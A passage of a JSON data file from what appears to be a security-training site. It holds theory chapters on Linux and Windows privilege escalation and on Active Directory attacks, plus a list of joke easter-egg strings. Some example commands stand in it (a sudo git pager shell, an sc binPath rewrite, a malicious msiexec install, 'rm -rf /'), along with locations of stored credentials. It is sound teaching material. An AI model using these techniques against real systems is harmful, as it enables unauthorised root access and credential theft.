      "body": "<h1 id=\"linux-privilege-escalation\">Linux Privilege Escalation</h1>\n<p>You start with shell access as an unprivileged user — <code>www-data</code>, <code>tomcat</code>, some application account. The goal is to become <code>root</code>. Linux privilege escalation is the study of all the <em>legitimate</em> mechanisms by which the kernel will let one user act as another, and the <em>misconfigurations</em> of those mechanisms that give an attacker a path.</p>\n<p>This is theory, not a recipe. The recipe lives in the enumeration checklists; the <em>why</em> lives here.</p>\n<h2 id=\"the-basic-model\">The basic model</h2>\n<p>Linux identity is a tuple of integers attached to every process:</p>\n<ul>\n<li><strong>UID</strong> / <strong>EUID</strong> — the user the kernel uses for access control decisions.</li>\n<li><strong>GID</strong> / <strong>EGID</strong> — the same for groups.</li>\n<li><strong>Supplementary groups</strong> — extra groups the user belongs to.</li>\n<li><strong>Capabilities</strong> — fine-grained powers split out from \"root can do anything\".</li>\n</ul>\n<p>The kernel checks these on every syscall. UID 0 (root) bypasses almost every check. Everything below is about getting EUID == 0 — or finding a capability subset that is functionally equivalent.</p>\n<h2 id=\"suid-and-sgid\">SUID and SGID</h2>\n<p>A regular binary runs with the calling user's UID. A binary with the <strong>SUID bit</strong> runs with the <em>owner's</em> UID, regardless of who launched it. That's how <code>passwd</code> (owned by root, SUID) can edit <code>/etc/shadow</code> even though you, the caller, cannot.</p>\n<p>The misconfiguration: a SUID-root binary that <em>invokes the shell</em>, <em>reads a file</em>, <em>executes a path under the caller's control</em>, or <em>honours environment variables it should sanitise</em>. The whole <strong>GTFOBins</strong> project catalogues legitimate utilities whose features (because they were not designed for SUID use) become root-shell primitives when the SUID bit is set: <code>find</code>, <code>vim</code>, <code>awk</code>, <code>less</code>, <code>tar</code>, <code>nmap</code> with <code>--interactive</code>, <code>python</code> with <code>os.system</code>. The bug is not in the binary — it is in giving the SUID bit to a binary that has features that don't belong to a privileged context.</p>\n<p>SGID is the same idea for groups. Less common but identical in mechanism — a SGID binary owned by <code>shadow</code> group can read <code>/etc/shadow</code> even without root.</p>\n<h2 id=\"capabilities\">Capabilities</h2>\n<p>A more recent (Linux 2.2+) alternative to SUID. Instead of \"root or not root\", a binary can carry specific capabilities such as:</p>\n<ul>\n<li><code>CAP_NET_RAW</code> — open raw sockets (what <code>ping</code> actually needs).</li>\n<li><code>CAP_SYS_ADMIN</code> — the \"kitchen sink\"; ~30% of all kernel privileges.</li>\n<li><code>CAP_DAC_READ_SEARCH</code> — bypass file read permission checks.</li>\n<li><code>CAP_SETUID</code> / <code>CAP_SETGID</code> — switch UID/GID at will.</li>\n</ul>\n<p>The principle of least privilege says you should give <code>ping</code> only <code>CAP_NET_RAW</code>, not full SUID-root. In practice many capabilities are <em>equivalent to root</em>:</p>\n<ul>\n<li><code>CAP_SYS_ADMIN</code> includes mount, namespace operations, kernel module loading.</li>\n<li><code>CAP_DAC_READ_SEARCH</code> reads any file (so <code>/etc/shadow</code>, so any password hash, so root via cracking).</li>\n<li><code>CAP_SYS_PTRACE</code> attaches to any process (so any process running as root, so its memory).</li>\n<li><code>CAP_SETUID</code> lets you become any user (so root).</li>\n</ul>\n<p>A binary holding any of these capabilities is, for privilege-escalation purposes, equivalent to a SUID-root binary.</p>\n<h2 id=\"sudo-misconfiguration\"><code>sudo</code> misconfiguration</h2>\n<p><code>/etc/sudoers</code> declares which users can run which commands as which other users. Common bugs:</p>\n<ul>\n<li><strong><code>NOPASSWD: ALL</code></strong> for a non-trusted user — instant root.</li>\n<li><strong><code>NOPASSWD: /usr/bin/some-helper</code></strong> where the helper itself is a GTFOBins entry — same end state.</li>\n<li><strong>Wildcards</strong> in command paths — <code>NOPASSWD: /usr/bin/git *</code> lets you pass <code>-c core.pager=\"bash\"</code> and get a shell via the pager.</li>\n<li><strong><code>env_keep</code> of dangerous variables</strong> — <code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code>, <code>PYTHONPATH</code> preserved across sudo. The attacker invokes the allowed sudo command but injects a malicious library into its load path.</li>\n</ul>\n<p>The <code>sudo -l</code> enumeration step is one of the highest signal-to-noise checks: it tells you exactly which sudo paths are open to your user.</p>\n<h2 id=\"scheduled-tasks-cron-systemd-timers\">Scheduled tasks (cron, systemd timers)</h2>\n<p>Tasks running as root provide a privilege boundary. The boundary fails when:</p>\n<ul>\n<li>the script run by cron is <strong>writable by you</strong> — modify it, wait, get root.</li>\n<li>the script lives in a <strong>writable directory</strong> with an attacker-relative path (<code>./script.sh</code> when cron <code>cd</code>s into your directory).</li>\n<li>the script invokes binaries via <code>PATH</code> instead of absolute paths, and you can place a binary earlier in <code>PATH</code>.</li>\n<li>the script processes files in a directory you control (e.g. a \"process all <code>*.tar.gz</code> in <code>/tmp/incoming/</code>\" job): drop a malicious tarball, get code execution as root when the next run picks it up.</li>\n</ul>\n<h2 id=\"writable-sensitive-files\">Writable sensitive files</h2>\n<p>The classic short list:</p>\n<ul>\n<li><code>/etc/passwd</code> writable → add a UID-0 entry with no password.</li>\n<li><code>/etc/shadow</code> writable → replace root's hash with one you know.</li>\n<li><code>/etc/sudoers</code> writable → grant yourself <code>NOPASSWD: ALL</code>.</li>\n<li>A binary in <code>/usr/local/bin</code> writable (and earlier in someone's <code>PATH</code>) → wait for someone to invoke it.</li>\n<li>A SUID binary that loads a shared library from a writable directory → place a malicious <code>.so</code>.</li>\n<li><code>/etc/ld.so.preload</code> writable → arbitrary code injected into every dynamically linked binary.</li>\n</ul>\n<h2 id=\"kernel-exploits\">Kernel exploits</h2>\n<p>When everything else is locked down, the kernel itself becomes the attack surface. <code>uname -a</code> discloses the kernel version; public exploits (DirtyCOW, DirtyPipe, OverlayFS bugs, eBPF, io_uring) targeting that kernel return root from any unprivileged context. The mitigation here is <em>patch management</em>; the attacker mitigation is checking the kernel CVE list before throwing exploits that might panic the box.</p>\n<h2 id=\"container-escapes\">Container escapes</h2>\n<p>A \"shell as root inside a container\" is not root on the host — unless the container is misconfigured. The usual culprits:</p>\n<ul>\n<li><code>--privileged</code> (essentially \"no security boundary\") — direct device access, mount the host filesystem, escape.</li>\n<li>Mounted Docker socket (<code>/var/run/docker.sock</code>) inside the container — start a new container with the host's <code>/</code> mounted, chroot in, write to host filesystem as host-root.</li>\n<li>Dangerous host mounts (<code>/</code>, <code>/var</code>, <code>/etc</code>) — same shape.</li>\n<li>Kernel capabilities the container doesn't actually need (<code>CAP_SYS_MODULE</code>, <code>CAP_SYS_ADMIN</code>).</li>\n</ul>\n<p>Container = process with a different view of the filesystem and namespaces. It is <em>not</em> a security boundary unless every one of those settings is right.</p>\n<h2 id=\"the-mindset\">The mindset</h2>\n<p>Privilege escalation is rarely a single exploit. It is reading what your current user <em>can</em> do — files writable, sudo entries allowed, processes running as root that touch attacker-controllable inputs — and finding the place where \"what I can do\" intersects \"what gives me root\". Tools like <code>linpeas</code> and <code>pspy</code> exist to make that intersection visible quickly; understanding <em>why</em> each finding is dangerous is what lets you use them well.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Windows Privilege Escalation — Theory",
      "slug": "windows-privilege-escalation-theory",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "windows",
        "privesc",
        "theory"
      ],
      "desc": "You have a foothold as a local user, a service account (IIS APPPOOL\\app, MSSQL$SQLEXPRESS, LOCAL SERVICE), or a low-integrity process. The goal is NT AUTHORITY\\SYSTEM — the kernel-equivalent identity that owns the host. Windows privilege escalation is the study of the…",
      "body": "<h1 id=\"windows-privilege-escalation\">Windows Privilege Escalation</h1>\n<p>You have a foothold as a local user, a service account (<code>IIS APPPOOL\\app</code>, <code>MSSQL$SQLEXPRESS</code>, <code>LOCAL SERVICE</code>), or a low-integrity process. The goal is <code>NT AUTHORITY\\SYSTEM</code> — the kernel-equivalent identity that owns the host. Windows privilege escalation is the study of the legitimate identity model the OS exposes, and the misconfigurations that let a low-privilege caller cross identity boundaries it should not.</p>\n<h2 id=\"the-identity-model\">The identity model</h2>\n<p>Windows identity is richer than the Linux UID/GID tuple. Each process carries an <strong>access token</strong> containing:</p>\n<ul>\n<li><strong>User SID</strong> — the principal (e.g. <code>S-1-5-21-…-1001</code> for a local user, <code>S-1-5-18</code> for SYSTEM).</li>\n<li><strong>Group SIDs</strong> — every group the user belongs to.</li>\n<li><strong>Privileges</strong> — fine-grained powers (named like <code>SeDebugPrivilege</code>, <code>SeImpersonatePrivilege</code>, <code>SeBackupPrivilege</code>).</li>\n<li><strong>Integrity Level (IL)</strong> — Low / Medium / High / System. A process at lower IL cannot write to objects at higher IL even if its DACL permits it.</li>\n<li><strong>TOKEN type</strong> — <em>primary</em> (assigned to the process) or <em>impersonation</em> (a clone of another user's token that the holding process can act under).</li>\n</ul>\n<p>Access decisions check both the DACL on the target object <strong>and</strong> the privileges/IL of the token. A user can be a member of <code>Administrators</code> and still run with a <em>medium-IL</em> token most of the time — that's UAC.</p>\n<h2 id=\"uac-what-it-actually-does\">UAC // what it actually does</h2>\n<p>User Account Control is <strong>not a security boundary</strong>, in Microsoft's own words. When a user in the Administrators group logs in, Windows creates <em>two</em> tokens:</p>\n<ul>\n<li>A <strong>filtered</strong> token (medium IL, admin privileges stripped) — used by default for all processes.</li>\n<li>A <strong>full</strong> token (high IL, all admin privileges) — used when the user explicitly elevates.</li>\n</ul>\n<p>UAC is the prompt that asks for confirmation before swapping in the full token. Its goal is to prevent <em>accidental</em> privilege use, not to stop a determined attacker who already has code execution in the filtered token. <strong>UAC bypasses</strong> (using auto-elevating signed Microsoft binaries to launch a high-IL process without a prompt) are abundant; treating \"user is in Admins but not yet elevated\" as a security boundary is a misreading of the design.</p>\n<p>The genuine boundary is the user account itself: you cannot UAC-bypass into another user's session. UAC is a within-account convenience, not a cross-account barrier.</p>\n<h2 id=\"service-abuse\">Service abuse</h2>\n<p>Services run with their own identity (<code>SYSTEM</code>, <code>LocalService</code>, <code>NetworkService</code>, or a domain account) and start automatically. Several misconfigurations let a low-privilege user redirect a service into running attacker code:</p>\n<h3 id=\"unquoted-service-paths\">Unquoted service paths</h3>\n<p>If the registry entry for a service contains a path with spaces <em>and is not quoted</em>:</p>\n<pre><code>ImagePath: C:\\Program Files\\Some App\\service.exe\n</code></pre>\n<p>The Service Control Manager tries each prefix as a candidate executable:</p>\n<pre><code>C:\\Program.exe\nC:\\Program Files\\Some.exe\nC:\\Program Files\\Some App\\service.exe   ← intended\n</code></pre>\n<p>If the user can write a binary into any of those earlier paths (typically <code>C:\\Program.exe</code> is impossible, but writeable intermediate folders do exist), the next service restart launches the attacker's binary as the service identity.</p>\n<h3 id=\"weak-service-permissions\">Weak service permissions</h3>\n<p>A user with <code>SERVICE_CHANGE_CONFIG</code> on a high-privilege service can reassign the binary path itself: <code>sc config &lt;svc&gt; binPath= \"cmd.exe /c calc.exe\"</code>. Less common today (modern hardening removes these), but ICACLS misconfigurations on third-party software remain a frequent finding.</p>\n<h3 id=\"dll-hijacking-dll-search-order-abuse\">DLL hijacking / DLL search-order abuse</h3>\n<p>Windows resolves DLL imports in a deterministic search order: application directory, system directories, <code>PATH</code>, current directory. If a privileged process loads a library that does <em>not</em> exist in a directory checked early in the order, an attacker who can write to <em>any</em> directory checked earlier wins. Variant attacks:</p>\n<ul>\n<li><strong>Phantom DLLs</strong> — the application tries to load <code>version.dll</code> from its own folder before falling back to <code>C:\\Windows\\System32</code>. Drop one in the app folder.</li>\n<li><strong>Side-by-side hijack</strong> — application manifest references a SxS assembly the attacker can plant.</li>\n<li><strong>Path hijack</strong> — a privileged service has a writable directory in its DLL search path.</li>\n</ul>\n<p>The structural cause is the same as Linux's <code>LD_PRELOAD</code> / <code>LD_LIBRARY_PATH</code> family — code that runs trusted resolves untrusted resource locations without integrity checks.</p>\n<h2 id=\"token-impersonation-and-the-potato-family\">Token impersonation and the \"Potato\" family</h2>\n<p>The privilege <code>SeImpersonatePrivilege</code> (held by default by service accounts like <code>IIS APPPOOL\\*</code>, <code>MSSQL$*</code>, <code>Network Service</code>) allows a process to <em>act as</em> any user whose token it can obtain. Obtaining a token from a real user is the trick.</p>\n<p>The \"Potato\" exploit family (Hot/Rotten/Juicy/Rogue/God Potato) chains:</p>\n<ol>\n<li>trigger a Windows component to authenticate to a local listener the attacker controls,</li>\n<li>capture the negotiated authentication exchange,</li>\n<li>relay or replay it to obtain a SYSTEM token,</li>\n<li>impersonate that token under the service account's <code>SeImpersonatePrivilege</code>.</li>\n</ol>\n<p>The technique evolved as Microsoft patched specific triggers; each generation found a new way to coerce a SYSTEM-context authentication. The <em>structural</em> cause is \"service accounts hold <code>SeImpersonatePrivilege</code> so they can serve multiple users\" — a feature, not a bug. The fix is to remove the privilege from accounts that don't actually need it, and to harden the local authentication endpoints the exploits abuse.</p>\n<h2 id=\"alwaysinstallelevated\">AlwaysInstallElevated</h2>\n<p>A pair of registry keys that, when both set to 1, instruct Windows Installer to run <em>every</em> <code>.msi</code> package with SYSTEM privileges — even one launched by a low-privilege user:</p>\n<pre><code>HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1\nHKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1\n</code></pre>\n<p>The user crafts a malicious MSI (<code>msiexec /quiet /qn /i evil.msi</code>) and gets SYSTEM. This setting exists for centrally-managed software deployment scenarios; finding it enabled on a workstation is almost always a Group Policy mistake.</p>\n<h2 id=\"credentials-at-rest\">Credentials at rest</h2>\n<p>The attacker rarely needs to escalate via <em>exploits</em> if credentials are sitting on disk:</p>\n<ul>\n<li><strong>Unattended install files</strong> — <code>C:\\Windows\\Panther\\Unattend.xml</code>, <code>sysprep.inf</code>, <code>sysprep.xml</code> — historically contained the local admin password in cleartext or base64.</li>\n<li><strong>AutoLogon registry</strong> — <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword</code>.</li>\n<li><strong>PowerShell history</strong> — <code>%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> regularly contains credentials piped into commands.</li>\n<li><strong>GPP cpassword</strong> — Group Policy Preferences stored encrypted credentials with a <em>publicly published</em> AES key. The XML in SYSVOL was readable by any authenticated user. Microsoft patched the feature but legacy data lingers in many domains.</li>\n<li><strong>Saved RDP credentials</strong> (<code>*.rdg</code> files), <strong>WinSCP sessions</strong>, <strong>PuTTY sessions</strong> — application credential stores are frequent finds.</li>\n<li><strong>DPAPI-protected secrets</strong> — browser passwords, Outlook saved accounts, Wi-Fi keys. Decryptable from the user's profile with the user's master key (<code>mimikatz</code> automates this).</li>\n</ul>\n<p>A privilege escalation that requires no exploit is the most reliable kind.</p>\n<h2 id=\"scheduled-tasks-and-startup-persistence\">Scheduled tasks and startup persistence</h2>\n<p><code>schtasks /query /fo LIST /v</code> enumerates every scheduled task. Same logic as Linux cron: a task running as SYSTEM that invokes a script in a user-writable folder, or a binary that is itself writable, hands you SYSTEM at the next trigger. Startup folders (<code>%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\</code>) and Run keys (<code>HKLM\\...\\Run</code>) are watched-for paths during privilege escalation hunting precisely because they are common misconfigurations.</p>\n<h2 id=\"lsass-the-credential-vault\">LSASS // the credential vault</h2>\n<p>The Local Security Authority Subsystem (<code>lsass.exe</code>) holds, in memory:</p>\n<ul>\n<li>NT hashes of users currently logged in,</li>\n<li>Kerberos TGTs and service tickets,</li>\n<li>WDigest plaintext passwords (when enabled — disabled by default since 2014, still on in some legacy environments),</li>\n<li>Credentials cached for delegation.</li>\n</ul>\n<p>A user with <code>SeDebugPrivilege</code> (or any administrator equivalent) can attach to LSASS and dump its memory. Tools like <strong>mimikatz</strong> parse the dump and recover every credential it holds. From there: pass-the-hash to other machines, pass-the-ticket against any service, lateral movement throughout the domain.</p>\n<p>Modern Windows offers <strong>Credential Guard</strong> (LSASS in a VBS-isolated container that even kernel code cannot read), <strong>Protected Process Light</strong>, and <strong>LSA Protection</strong>. Each closes a class of LSASS dumping primitives; none is enabled by default on every SKU.</p>\n<h2 id=\"vulnerable-drivers-byovd\">Vulnerable drivers (BYOVD)</h2>\n<p>Even on a fully patched, hardened Windows box, the kernel attack surface remains open via signed but vulnerable third-party drivers. The \"Bring Your Own Vulnerable Driver\" technique:</p>\n<ol>\n<li>Drop a <em>legitimately signed</em> driver known to expose a kernel primitive (arbitrary read/write, MSR access).</li>\n<li>Load it via <code>sc create / Service Control Manager</code> — requires local admin, but bypasses kernel signing because the driver is signed.</li>\n<li>Use the driver's primitive to elevate to kernel: patch tokens of a chosen process, disable EDR, bypass Credential Guard.</li>\n</ol>\n<p>The driver's <em>vendor</em> is trusted; Microsoft maintains a driver block list, but it lags real-world findings. BYOVD has become the default endpoint-evasion plus privilege-escalation primitive for ransomware groups.</p>\n<h2 id=\"the-mindset\">The mindset</h2>\n<p>Linux privesc is mostly file permissions and paths; Windows privesc is mostly <em>tokens, privileges, and service identities</em>. Every Windows escalation reduces to one of:</p>\n<ul>\n<li>making a higher-privilege process run code you control (service abuse, DLL hijack, scheduled task, MSI elevation),</li>\n<li>impersonating a higher-privilege token (Potato family, <code>SeImpersonate</code> abuse),</li>\n<li>reading credentials that were stored where they shouldn't be (Unattend, GPP, LSASS, DPAPI),</li>\n<li>exploiting a kernel-level component (kernel CVE, BYOVD).</li>\n</ul>\n<p>Enumeration tools (<code>winPEAS</code>, <code>Seatbelt</code>, <code>PowerUp</code>) automate finding <em>which</em> of these is open on this specific host. Understanding <em>why</em> each one is dangerous is what lets you read their output without panic.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Active Directory — Fundamentals",
      "slug": "active-directory-fundamentals",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "active-directory",
        "kerberos",
        "windows",
        "theory"
      ],
      "desc": "Active Directory is Microsoft's directory + identity system. In an enterprise it is the system: it stores every user, computer, group, and policy in the organisation, and authenticates them centrally. Compromising it is rarely a single bug — it is a series of weakly-checked…",
      "body": "<h1 id=\"active-directory-fundamentals\">Active Directory // Fundamentals</h1>\n<p>Active Directory is Microsoft's directory + identity system. In an enterprise it is <em>the</em> system: it stores every user, computer, group, and policy in the organisation, and authenticates them centrally. Compromising it is rarely a single bug — it is a series of weakly-checked relationships, each of which was legitimate when configured.</p>\n<p>This is theory. Hands-on attack chains (Kerberoasting commands, ADCS exploitation, BloodHound pathing) live in the writeups and cheatsheets. Here we look at <em>why</em> AD is shaped the way it is and <em>where</em> the structural weak points are.</p>\n<h2 id=\"the-objects\">The objects</h2>\n<p>Every AD object has a class and a set of attributes. The classes that matter for attackers:</p>\n<ul>\n<li><strong>User</strong> — has a SAM account name, UPN, password hash (NT), and group memberships.</li>\n<li><strong>Computer</strong> — a special user that represents a domain-joined machine. Also has a password (rotated automatically). The \"machine account\" is <code>HOSTNAME$</code>.</li>\n<li><strong>Group</strong> — a container that grants its membership the union of access of its members. Groups can nest groups (AGDLP).</li>\n<li><strong>Organisational Unit (OU)</strong> — a container used for delegating administration and applying Group Policy.</li>\n<li><strong>GPO (Group Policy Object)</strong> — a set of registry-and-script policies applied to OUs.</li>\n<li><strong>Service Principal Name (SPN)</strong> — a string identifying a service running under a particular user account (<code>MSSQLSvc/db01:1433</code> → \"the MSSQL on db01:1433 runs as <em>this</em> user\"). SPNs are how Kerberos tickets get routed to the right service.</li>\n</ul>\n<p>All of these live in a hierarchical database accessed via <strong>LDAP</strong>. Any authenticated user can read most of it. That visibility is the starting point for every AD attack.</p>\n<h2 id=\"authentication-ntlm-vs-kerberos\">Authentication // NTLM vs Kerberos</h2>\n<p>AD supports two authentication protocols:</p>\n<h3 id=\"ntlm-legacy-still-everywhere\">NTLM (legacy, still everywhere)</h3>\n<p>Challenge–response over the user's NT hash:</p>\n<ol>\n<li>Client says \"I'm Alice\" to the server.</li>\n<li>Server sends a random challenge.</li>\n<li>Client computes <code>HMAC(NT_hash, challenge + ...)</code> and sends the response.</li>\n<li>Server forwards both to a Domain Controller, which knows the NT hash and verifies.</li>\n</ol>\n<p>Three structural problems:</p>\n<ul>\n<li><strong>Pass-the-Hash.</strong> The protocol never uses the <em>password</em>, only the NT hash. If you steal the hash (from LSASS, SAM, NTDS.dit) you can authenticate as the user without ever knowing the cleartext.</li>\n<li><strong>NTLM relay.</strong> A client's response is to a <em>specific challenge</em> — if an attacker can man-in-the-middle and choose the challenge, they can use the client's response to authenticate <em>to a third party</em>. SMB signing and LDAP channel binding are designed to stop this; they are off by default on many endpoints.</li>\n<li><strong>No mutual authentication.</strong> Client trusts that the server is who it claims to be.</li>\n</ul>\n<p>NTLM is <em>deprecated</em> and Microsoft is removing it. It is still enabled almost everywhere because legacy applications break without it.</p>\n<h3 id=\"kerberos-the-modern-path\">Kerberos (the modern path)</h3>\n<p>Three-party ticket protocol:</p>\n<ol>\n<li>Client encrypts a timestamp with its password-derived key and sends it to the <strong>KDC</strong>. KDC decrypts → proves the client knows the password → returns a <strong>TGT</strong> (Ticket Granting Ticket) encrypted with the KDC's own master key (<code>krbtgt</code> account hash).</li>\n<li>Client wants to talk to service <code>cifs/file01</code>. It sends the TGT plus a request for that service to the KDC. KDC returns a <strong>service ticket</strong> encrypted with the <em>service account's</em> hash.</li>\n<li>Client presents the service ticket to the service. The service decrypts it with its own hash → trusts the client.</li>\n</ol>\n<p>The protocol elegantly avoids reusing the password and supports mutual authentication. But the cryptographic primitives in step 1 and step 2 each enable a known attack:</p>\n<ul>\n<li><strong>AS-REP Roasting.</strong> Step 1 is normally protected by Kerberos pre-authentication (the client encrypts the timestamp). If pre-auth is <em>disabled</em> for a user (a legacy compatibility option that gets left on), an attacker can request a TGT for them <em>without knowing the password</em> — the KDC returns data encrypted with the user's password hash. That blob is then offline-crackable.</li>\n<li><strong>Kerberoasting.</strong> Step 2 returns a ticket encrypted with the <em>service account's</em> hash. Any authenticated domain user can request a service ticket for any SPN — and then crack the returned blob offline. Service accounts with weak passwords fall in minutes.</li>\n<li><strong>Golden Ticket.</strong> If you steal the <code>krbtgt</code> hash (the KDC's master key), you can forge TGTs for <em>any user, with any group membership, with arbitrary lifetime</em>. Detection is hard because the forged ticket validates cleanly. Rotation of <code>krbtgt</code> twice is the only recovery.</li>\n<li><strong>Silver Ticket.</strong> If you steal a <em>service account's</em> hash, you can forge service tickets for that one service. Narrower than Golden Ticket but stealthier (no contact with the DC).</li>\n<li><strong>Delegation abuse.</strong> Accounts trusted for delegation (unconstrained, constrained, RBCD) can request tickets <em>as another user</em>. Misconfigured delegation is one of the most common Domain Admin paths.</li>\n</ul>\n<h2 id=\"acls-the-second-universe-of-bugs\">ACLs // the second universe of bugs</h2>\n<p>Every AD object has a <strong>DACL</strong> (Discretionary Access Control List). The DACL grants specific <em>rights</em> to specific <em>principals</em>:</p>\n<ul>\n<li><code>GenericAll</code> / <code>WriteDACL</code> / <code>WriteOwner</code> — control over the target object.</li>\n<li><code>ForceChangePassword</code> — reset the target's password without knowing the old one.</li>\n<li><code>WriteProperty</code> on <code>member</code> (against a group) — add yourself to it.</li>\n<li><code>AllExtendedRights</code> on a user — includes the right to read the user's LAPS-managed local admin password.</li>\n<li><code>WriteProperty</code> on <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> — set Resource-Based Constrained Delegation, then act as any user against the target.</li>\n</ul>\n<p>These are <strong>legitimate features</strong>. Nothing in AD's design forbids granting <code>GenericAll</code> on a Domain Admin from a junior IT account — and indeed, decades of helpdesk delegation produce sprawling ACL graphs nobody fully understands. <strong>BloodHound</strong> exists because no human can hold the ACL graph in their head; it computes the shortest path from \"low-priv user X\" to \"Domain Admins\" by traversing these edges.</p>\n<p>The attack pattern is always: enumerate where my user has any edge → take the action that edge permits → land at a new identity → enumerate again. Lateral movement in AD is graph traversal.</p>\n<h2 id=\"adcs-active-directory-certificate-services\">ADCS // Active Directory Certificate Services</h2>\n<p>The certificate authority bolted onto AD. Issues certificates for everything from email signing to smart-card login. If certificate templates are misconfigured (the <strong>ESC1–ESC13</strong> family), an authenticated user can request a certificate that <em>authenticates as someone else</em> — typically Domain Admin. The certificate is then used in PKINIT Kerberos to get a TGT as that user. ESC1 alone (template allows <code>EnrolleeSuppliesSubject</code> + client auth) is enough to escalate from any user to any user in the forest.</p>\n<p>Detection is hard because the certificate request is a <em>normal AD operation</em>; the attack signature is \"an unexpected user enrolled for the UserAuthentication template specifying an Administrator SAN\".</p>\n<h2 id=\"the-mental-model\">The mental model</h2>\n<p>AD is a federated trust graph. Every account, every group membership, every ACL edge, every service ticket exchange is a node and an edge in that graph. The attacker's view of an AD environment is the connected component of the graph reachable from their starting identity. Each successful step (cracked SPN, abused ACL, intercepted ticket, exploited template) is <em>adding edges</em> to that reachable set. Domain compromise happens when the reachable set includes a high-privilege node (Domain Admin, <code>krbtgt</code>, the Enterprise CA).</p>\n<p>Defence is <em>graph reduction</em>: tier the environment (Tier 0 = DCs and DA accounts isolated; Tier 1 = servers; Tier 2 = workstations), block cross-tier credential exposure, audit ACLs, retire NTLM, harden Kerberos delegation, monitor for ticket anomalies, rotate <code>krbtgt</code> regularly. None of these is a \"patch the bug\" fix; they are reductions of the legitimate trust surface that AD's design exposes.</p>",
      "tag": "THEORY · CHAPTER"
    }
  ],
  "easterEggs": {
    "sudo": "nice try. sudo is disabled on this box.",
    "rmrf": "rm -rf /  # aborted. you know better.",
    "matrix": "wake up, neo...",
    "ghost": "👻 ghost in the shell detected",
    "konami": "↑↑↓↓←→←→BA — 30 extra lives granted",
    "coffee": "☕ brewing... sverz1 needs coffee",
    "hack": "hacking the planet 🌐",
    "xyzzy": "nothing happens.",
    "pwn": "💀 pwned — but by whom?",
    "0day": "we don't talk about 0days in public 🤫",
    "sverz": "you found me. hi 👋",
    "htb": "ippsec is watching."
  },
  "counts": {
    "writeups": 17,
    "enumeration": 14,
    "notes": 4,
    "cheatsheets": 4,
    "fundamentals": 19
  }
};
